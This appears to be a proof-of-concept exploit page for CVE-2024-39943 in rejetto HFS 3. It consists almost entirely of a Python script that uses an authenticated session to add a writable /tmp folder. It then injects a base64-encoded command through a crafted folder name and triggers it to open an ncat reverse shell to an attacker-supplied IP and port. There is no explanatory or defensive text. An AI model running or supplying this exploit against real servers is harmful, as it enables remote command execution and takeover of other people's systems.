# CVE_2024_39943

from: https://github.com/wy876/POC/blob/main/rejetto-HFS-3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-39943).md


```
import requests as req
import base64

url = input("Url: ")
cookie = input("Cookie: ")
ip = input("Ip: ")
port = input("Port: ")

headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}

print("Step 1 add vfs")
step1 = req.post(url+"~/api/add_vfs", headers=headers, json={"parent":"/","source":"/tmp"})

print("Step 2 set permission vfs")
step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})

print("Step 3 create folder")
command = "ncat {0} {1} -e /bin/bash".format(ip,port)
command = command.encode('utf-8')
payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})

print("Step 4 execute payload")
step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
```
